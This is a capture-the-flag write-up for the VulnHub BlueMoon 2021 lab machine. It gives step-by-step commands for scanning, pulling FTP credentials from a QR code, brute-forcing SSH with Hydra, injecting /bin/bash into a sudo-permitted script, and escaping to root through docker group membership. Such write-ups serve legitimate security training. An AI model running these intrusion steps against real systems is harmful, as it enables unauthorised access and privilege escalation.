# VulnHub Writeup: BlueMoon 2021

## Target Information
* **Hostname:** BlueMoon 
* **Target IP:** 192.168.56.105 
* **Operating System:** Debian GNU/Linux 10 
* **Attacker IP:** 192.168.56.101 

---

## 1. Network Discovery
First, the attacker machine's IP address (Kali Linux) was checked using the command:
  
```bash
ifconfig
```

* **Attacker IP (Kali Linux):** `192.168.56.101`.

Next, a network scan was performed to find the target using the command:

```bash
nmap -sn 192.168.56.0/24
```

* **Target IP:** `192.168.56.105`.

## 2. Port Scanning
A detailed Nmap scan was executed using the command :

```bash
nmap -sC -sV -Pn -vv 192.168.56.105
```

* The scan discovered an open port ``22/tcp`` running the SSH service, specifically ``OpenSSH 7.9p1``.
* An open port ``80/tcp`` was found running the HTTP service with ``Apache httpd 2.4.38``.
* Additionally, an open port ``21/tcp`` was discovered running the FTP service with ``vsftpd 3.0.3``.


## 3. Web Enumeration

The `gobuster` tool was used to enumerate web directories using the following command:

```bash
gobuster dir -u http://192.168.56.105 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

* The scan successfully discovered the `/hidden_text` directory (Status: 200).
* Navigating to the main webpage `http://192.168.56.105` displayed the text "THE GAME BEGINS".
* Navigating to the discovered `/hidden_text` path revealed a maintenance page stating: `"Maintanance! Sorry For Delay, We Will Recover Soon. Thank You..."`.
* After clicking on the ``Thank You`` text, the website provides a ``QR code``.
* Scanning the ``QR code`` revealed a bash script containing FTP login credentials:

```bash
USER=userftp
PASSWORD=ftpp@ssword
```

## 4. FTP Enumeration
A connection to the FTP server was initiated from the attacker terminal using the command :

```bash
ftp 192.168.56.105
```
  
The login was successfully using username `userftp` and password `ftpp@ssword`.

The `ls` command was used to check the file system, revealing two files :
* `information.txt`
* `p_lists.txt`.

The transfer mode was switched to binary using the command :

```bash
bin
```

The files were downloaded using

```bash
get information.txt
get p_lists.txt
```

Close FTP session using the command :

```bash
exit
```

## 5. Analyzing Downloaded Files
Display the `information.txt` contents file using command :

```bash
cat information.txt
```

* The file contained a message to `robin` regarding their password weakness and noted that a `password list` was provided.

Display the `p_lists.txt` contents file using command command :

```bash
cat p_lists.txt
```

* The file contained `password list`.

## 6. Initial Access (SSH Brute-Force)
The Hydra tool was used against the SSH service with the command :

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.105
```

* Hydra successfully found a valid password for the user `robin`: `k4rv3ndh4nh4ck3r`.
* An SSH connection was established using the command `ssh robin@192.168.56.105`.

## 7. Privilege Escalation: Robin to Jerry
Check the user's privileges using the command :

```bash
sudo -l
```

The output demonstrated that the user `robin` could run the script `/home/robin/project/feedback.sh` as the user `jerry` without a password (NOPASSWD).

Use this command to execute as `Jerry` :

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

When running the feedback script, `test` was entered as the name, and `/bin/bash` was injected into the feedback prompt for the target machine.
* The `whoami` command confirmed the current user changed to `jerry`.

Upgrade shell using Python with the command :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 8. Privilege Escalation: Jerry to Root
The `id` command revealed that the user `jerry` was a member of the `docker` group (gid 114).

This privilege was exploited by running a Docker container to mount the root directory using the command :

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Change directory to root using :

```bash
cd /root
```

The contents of the root directory were listed using the command:

```Bash
ls
```

* This reveals the `root.txt` file.

The root flag file was read using the command:

```bash
cat root.txt
```

The final Root-Flag discovered was :

```bash
Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
```
